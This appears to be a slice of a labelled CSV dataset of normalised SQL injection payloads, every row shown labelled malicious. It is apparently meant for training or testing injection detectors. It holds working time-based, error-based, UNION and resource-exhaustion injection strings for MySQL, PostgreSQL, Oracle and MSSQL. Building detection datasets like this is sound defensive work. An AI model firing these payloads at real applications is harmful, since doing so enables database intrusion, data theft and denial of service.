row_index,payload_norm,label,sqli_type_hint
5580,"1' ) ) ) and make_set ( 7539 = 3946,3946 ) and ( ( ( 'qbpo' = 'qbpo",1,
5581,"1' where 9241 = 9241 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
5582,1 ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 3919 = 3919,1,
5583,"1 ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 2939 = 2939",1,
5584,"1"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""nthu"" like ""nthu",1,
5585,"1 ) where 3740 = 3740 union all select null,null,null,null,null,null,null,null--",1,
5586,"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",1,
5587,"1"" ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ""tlpw"" = ""tlpw",1,
5588,"1%' ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
5589,"iif ( 8770 = 9611,1,1/0 )",1,
5590,-2233' or ( 1807 = 7274 ) *7274,1,
5591,"1%' ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
5592,"1%' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( '%' = '",1,
5593,1' ) where 5279 = 5279 or sleep ( 5 ) #,1,
5594,select sleep ( 5 ) and ( ( ( 'qjsc' = 'qjsc,1,
5595,1%' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and '%' = ',1,
5596,"-2857%' ) ) ) union all select 7167,7167,7167,7167,7167,7167,7167,7167#",1,
5597,"1"" where 5845 = 5845 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
5598,1 ) as jtfx where 8038 = 8038,1,
5599,"-4699 ) as mymz where 3405 = 3405 or elt ( 1032 = 1032,3623 ) --",1,
5600,"1' ) ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
5601,"1%"" ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
5602,"1'|| ( select 'xbvz' from dual where 1632 = 1632 union all select null,null,null,null,null,null,null,null--",1,
5603,"1 ) ) as spdf where 8554 = 8554 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1,
5604,1'|| ( select 'ylio' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||',1,
5605,"-9160' ) union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",1,
5606,"1"" and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
5607,"-5972"" or 8509 = 3448#",1,
5608,"1 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
5609,"1' ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'ccqs' = 'ccqs",1,
